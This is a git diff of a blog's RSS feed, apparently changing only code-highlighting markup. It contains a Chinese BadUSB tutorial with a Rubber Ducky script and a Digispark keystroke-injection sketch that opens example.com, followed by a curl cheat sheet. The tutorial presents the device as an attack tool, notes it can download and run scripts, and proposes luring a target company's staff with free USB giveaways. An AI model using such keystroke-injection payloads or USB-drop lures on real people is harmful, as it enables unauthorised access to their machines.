+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>writing: 80% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; Starting the user app ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>running: 100% complete
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt; Micronucleus &lt;span style="color:#66d9ef">done&lt;/span>. Thank you!
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将板子插入&lt;span class="spoiler" >&lt;del>受害者&lt;/del>&lt;/span>朋友的 Windows 设备上，就可以看到运行 notepad 并输出 hello world 了。&lt;/p>
 &lt;h3 id="更进一步">更进一步&lt;/h3>
 &lt;p>现在可以尝试自己写一个 payload 了。&lt;/p>
 &lt;p>其实利用 BadUSB 的攻击过程，就是将 Digispark 开发板伪装成为一个 HID（Human Interface Device）。&lt;/p>
@@ -436,90 +452,112 @@ running: 100% complete
 &lt;/code>&lt;/pre>&lt;p>可以通过添加、修改注册表项，下载执行脚本，执行命令，结束进程等达到一系列我们想要实现的结果。
 现在网上给 BadUSB 准备的脚本多为给 Rubber Ducky 准备的，还好我们可以进行转换，其实原理都是一样的，只不过实现代码不同。
 Rubber Ducky 的代码长这样：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bat" data-lang="bat">DELAY 600
-&lt;span style="color:#75715e">REM Linux run dialog&lt;/span>
-ALT F2
-DELAY 200
-&lt;span style="color:#75715e">REM Mac OS run dialog&lt;/span>
-GUI SPACE
-DELAY 200
-&lt;span style="color:#75715e">REM On Windows this changes the input language, so press 3 times&lt;/span>
-GUI SPACE
-DELAY 200
-GUI SPACE
-DELAY 200
-GUI r
-DELAY 200
-&lt;span style="color:#75715e">REM On another OS, this could have typed &amp;#34; r&amp;#34;. Backspace 4 times.&lt;/span>
-DELETE
-REPEAT 4
-&lt;span style="color:#75715e">REM Type in URL and open page!&lt;/span>
-STRING http://example.com/
-ENTER
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>以上脚本是模拟键盘在各种操作系统上的打开指定网页的操作。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bat" data-lang="bat">&lt;span style="display:flex;">&lt;span>DELAY 600
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">REM Linux run dialog&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ALT F2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY 200
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">REM Mac OS run dialog&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GUI SPACE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY 200
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">REM On Windows this changes the input language, so press 3 times&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GUI SPACE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY 200
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GUI SPACE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY 200
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GUI r
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY 200
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">REM On another OS, this could have typed &amp;#34; r&amp;#34;. Backspace 4 times.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELETE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>REPEAT 4
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">REM Type in URL and open page!&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>STRING http://example.com/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ENTER
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>以上脚本是模拟键盘在各种操作系统上的打开指定网页的操作。&lt;/p>
 &lt;p>可以使用 &lt;a href="https://nixu-corp.github.io/">dckunio.js&lt;/a> 来在线转换，也可以使用 &lt;a href="https://github.com/mame82/duck2spark">duck2spark&lt;/a> 脚本来进行转换。&lt;/p>
 &lt;p>上面的脚本转换好了长这样：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/*
-&lt;/span>&lt;span style="color:#75715e"> * Generated with &amp;lt;3 by Dckuino.js, an open source project !
-&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
-&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;avr/pgmspace.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;DigiKeyboard.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> line1[] PROGMEM &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://example.com/&amp;#34;&lt;/span>;
-&lt;span style="color:#66d9ef">char&lt;/span> buffer[&lt;span style="color:#ae81ff">256&lt;/span>];
-&lt;span style="color:#75715e">#define GetPsz(x) (strncpy_P(buffer, (char*)x, 256))
-&lt;/span>&lt;span style="color:#75715e">#define KEY_UP_ARROW 0x52
-&lt;/span>&lt;span style="color:#75715e">#define KEY_DOWN_ARROW 0x51
-&lt;/span>&lt;span style="color:#75715e">#define KEY_LEFT_ARROW 0x50
-&lt;/span>&lt;span style="color:#75715e">#define KEY_RIGHT_ARROW 0x4F
-&lt;/span>&lt;span style="color:#75715e">#define KEY_LEFT_GUI 0xE3
-&lt;/span>&lt;span style="color:#75715e">#define KEY_ESC 0x29
-&lt;/span>&lt;span style="color:#75715e">#define KEY_TAB 0x2B
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>
-&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">digiBegin&lt;/span>() {
-DigiKeyboard.sendKeyStroke(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">50&lt;/span>);
-}
-&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">digiEnd&lt;/span>() {
-&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> led&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
-pinMode(led, OUTPUT);
-&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
-digitalWrite(led, &lt;span style="color:#f92672">!&lt;/span>digitalRead(led));
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">1000&lt;/span>);
-}
-}
-&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">printText&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>txt) {
-DigiKeyboard.print(txt);
-DigiKeyboard.update();
-}
-&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setup&lt;/span>() {
-digiBegin();
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">600&lt;/span>);
-&lt;span style="color:#75715e">// Linux run dialog
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_F2,MOD_ALT_LEFT);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
-&lt;span style="color:#75715e">// Mac OS run dialog
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
-&lt;span style="color:#75715e">// On Windows this changes the input language, so press 3 times
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
-DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
-DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
-DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
-&lt;span style="color:#75715e">// On another OS, this could have typed &amp;#34; r&amp;#34;. Backspace 4 times.
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
-DigiKeyboard.sendKeyStroke(KEY_DELETE);
-}
-&lt;span style="color:#75715e">// Type in URL and open page!
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// http://example.com/
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> printText(GetPsz(line1));
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-digiEnd();
-}
-&lt;span style="color:#75715e">/* Unused endless loop */&lt;/span>
-&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">loop&lt;/span>() {}
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>首次烧录完，插入受攻击的设备没能正常实现功能，可能是驱动问题（部分情况耐心等待即可）、中文输入法问题（可以通过大写锁定键进行绕过）、不同操作系统快捷功能键不同，找到出现问题的步骤进行调试即可。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Generated with &amp;lt;3 by Dckuino.js, an open source project !
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;avr/pgmspace.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;DigiKeyboard.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> line1[] PROGMEM &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://example.com/&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> buffer[&lt;span style="color:#ae81ff">256&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define GetPsz(x) (strncpy_P(buffer, (char*)x, 256))
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KEY_UP_ARROW 0x52
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KEY_DOWN_ARROW 0x51
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KEY_LEFT_ARROW 0x50
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KEY_RIGHT_ARROW 0x4F
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KEY_LEFT_GUI 0xE3
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KEY_ESC 0x29
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KEY_TAB 0x2B
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">digiBegin&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.sendKeyStroke(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">50&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">digiEnd&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> led&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pinMode(led, OUTPUT);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> digitalWrite(led, &lt;span style="color:#f92672">!&lt;/span>digitalRead(led));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">1000&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">printText&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>txt) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.print(txt);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.update();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setup&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> digiBegin();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">600&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Linux run dialog
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_F2,MOD_ALT_LEFT);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Mac OS run dialog
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// On Windows this changes the input language, so press 3 times
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// On another OS, this could have typed &amp;#34; r&amp;#34;. Backspace 4 times.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.sendKeyStroke(KEY_DELETE);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Type in URL and open page!
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// http://example.com/
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> printText(GetPsz(line1));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DigiKeyboard.sendKeyStroke(KEY_ENTER);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> digiEnd();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* Unused endless loop */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">loop&lt;/span>() {}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>首次烧录完，插入受攻击的设备没能正常实现功能，可能是驱动问题（部分情况耐心等待即可）、中文输入法问题（可以通过大写锁定键进行绕过）、不同操作系统快捷功能键不同，找到出现问题的步骤进行调试即可。&lt;/p>
 &lt;p>如果不会编写 Rubber Ducky 脚本或者 Digispark 脚本，可以根据自己的攻击思路在 &lt;a href="https://www.ducktoolkit.com/">DuckToolkit&lt;/a> 生成 Rubber Ducky 的 Payload，然后进行转换即可。&lt;/p>
 &lt;p>另外，Digispark 开发版元件都是直接暴露出来的，这样容易造成短路等物理损坏。可以用热缩管将开发板隔离一下，或者是 3D 打印个 U 盘的外壳来进行伪装。用这个来做 BadUSB 搞社工成本还是很低的，只要在目标公司附近摆个「扫码领 U 盘」的活动就可以了，毕竟人才是最脆弱的安全系统。&lt;/p>
 &lt;p>参考：&lt;/p>
@@ -533,41 +571,41 @@ digiEnd();
 &lt;!--
 &lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
 嵌入 BiliBili 视频 --></description></item><item><title>Curl Cheat Sheet</title><link>https://hare.one/cheatsheet/curl-cheat-sheet/</link><pubDate>Fri, 17 Jul 2020 16:30:13 +0800</pubDate><guid>https://hare.one/cheatsheet/curl-cheat-sheet/</guid><description>&lt;h3 id="options">Options&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -o &amp;lt;file&amp;gt; &lt;span style="color:#75715e"># --output: write to file&lt;/span>
-curl -u user:pass &lt;span style="color:#75715e"># --user: Authentication&lt;/span>
-curl -v &lt;span style="color:#75715e"># --verbose&lt;/span>
-curl -vv &lt;span style="color:#75715e"># Even more verbose&lt;/span>
-curl -s &lt;span style="color:#75715e"># --silent&lt;/span>
-curl -i &lt;span style="color:#75715e"># --include: Include the HTTP-header in the output&lt;/span>
-curl -I &lt;span style="color:#75715e"># --head: headers only&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="request">Request&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -X POST &lt;span style="color:#75715e"># --request&lt;/span>
-curl -L &lt;span style="color:#75715e"># follow link if page redirects&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="data">Data&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -d &lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span> &lt;span style="color:#75715e"># --data: HTTP post data, URL encoded (eg, status=&amp;#34;Hello&amp;#34;)&lt;/span>
-curl -d @file &lt;span style="color:#75715e"># --data via file&lt;/span>
-curl -G &lt;span style="color:#75715e"># --get: send -d data via get&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="headers">Headers&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -A &amp;lt;str&amp;gt; &lt;span style="color:#75715e"># --user-agent&lt;/span>
-curl -b name&lt;span style="color:#f92672">=&lt;/span>val &lt;span style="color:#75715e"># --cookie&lt;/span>
-curl -b FILE &lt;span style="color:#75715e"># --cookie&lt;/span>
-curl -H &lt;span style="color:#e6db74">&amp;#34;X-Foo: y&amp;#34;&lt;/span> &lt;span style="color:#75715e"># --header&lt;/span>
-curl --compressed &lt;span style="color:#75715e"># use deflate/gzip&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ssl">SSL&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl --cacert &amp;lt;file&amp;gt; --capath &amp;lt;dir&amp;gt;
-curl -E, --cert &amp;lt;cert&amp;gt; &lt;span style="color:#75715e"># --cert: Client cert file --cert-type # der/pem/eng&lt;/span>
-curl -k, --insecure &lt;span style="color:#75715e"># for self-signed certs&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="examples">Examples&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e"># Post data:&lt;/span>
-curl -d password&lt;span style="color:#f92672">=&lt;/span>x http://x.com/y
-&lt;span style="color:#75715e"># Auth/data:&lt;/span>
-curl -u user:pass -d status&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Hello&amp;#34;&lt;/span> http://twitter.com/statuses/update.xml
-&lt;span style="color:#75715e"># multipart file upload&lt;/span>
-curl -v -include --form key1&lt;span style="color:#f92672">=&lt;/span>value1 --form upload&lt;span style="color:#f92672">=&lt;/span>@localfilename URL
-&lt;span style="color:#75715e"># Use Curl to Check if a remote resource is available&lt;/span>
-&lt;span style="color:#75715e"># details: https://matthewsetter.com/check-if-file-is-available-with-curl/&lt;/span>
-curl -o /dev/null --silent -Iw &lt;span style="color:#e6db74">&amp;#34;%{http_code}&amp;#34;&lt;/span> https://example.com/my.remote.tarball.gz
-&lt;/code>&lt;/pre>&lt;/div>&lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -o &amp;lt;file&amp;gt; &lt;span style="color:#75715e"># --output: write to file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -u user:pass &lt;span style="color:#75715e"># --user: Authentication&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -v &lt;span style="color:#75715e"># --verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -vv &lt;span style="color:#75715e"># Even more verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -s &lt;span style="color:#75715e"># --silent&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -i &lt;span style="color:#75715e"># --include: Include the HTTP-header in the output&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -I &lt;span style="color:#75715e"># --head: headers only&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="request">Request&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -X POST &lt;span style="color:#75715e"># --request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -L &lt;span style="color:#75715e"># follow link if page redirects&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="data">Data&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -d &lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span> &lt;span style="color:#75715e"># --data: HTTP post data, URL encoded (eg, status=&amp;#34;Hello&amp;#34;)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -d @file &lt;span style="color:#75715e"># --data via file&lt;/span>
